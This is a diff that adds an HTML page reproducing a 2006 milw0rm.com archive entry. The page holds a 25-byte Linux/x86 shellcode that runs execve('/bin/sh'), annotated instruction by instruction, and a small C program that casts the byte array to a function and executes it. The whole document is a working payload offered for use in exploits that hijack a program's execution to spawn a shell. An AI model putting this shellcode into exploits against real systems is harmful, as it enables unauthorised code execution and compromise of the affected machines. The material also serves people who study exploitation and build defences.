@@ -1,0 +1,29 @@
+<html><head><title>linux/x86 execve("/bin/sh", ["/bin/sh", NULL]) 25 bytes</title></head><pre>/*
+ * (Linux/x86) execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL]) 
+ * - 25 bytes
+ * - xgc@gotfault.net
+ *
+ */
+
+char shellcode[] =
+
+  &quot;\x31\xc0&quot;                    // xor    %eax, %eax
+  &quot;\x50&quot;                        // push   %eax
+  &quot;\x68\x2f\x2f\x73\x68&quot;        // push   $0x68732f2f
+  &quot;\x68\x2f\x62\x69\x6e&quot;        // push   $0x6e69622f
+  &quot;\x89\xe3&quot;                    // mov    %esp, %ebx
+  &quot;\x50&quot;                        // push   %eax
+  &quot;\x53&quot;                        // push   %ebx
+  &quot;\x89\xe1&quot;                    // mov    %esp, %ecx
+  &quot;\x31\xd2&quot;                    // xor    %edx, %edx
+  &quot;\xb0\x0b&quot;                    // mov    $0xb, %al
+  &quot;\xcd\x80&quot;;                   // int    $0x80
+
+int main() {
+
+        int (*f)() = (int(*)())shellcode;
+        printf(&quot;Length: %u\n&quot;, strlen(shellcode));
+        f();
+}
+
+// milw0rm.com [2006-04-03]</pre></html>
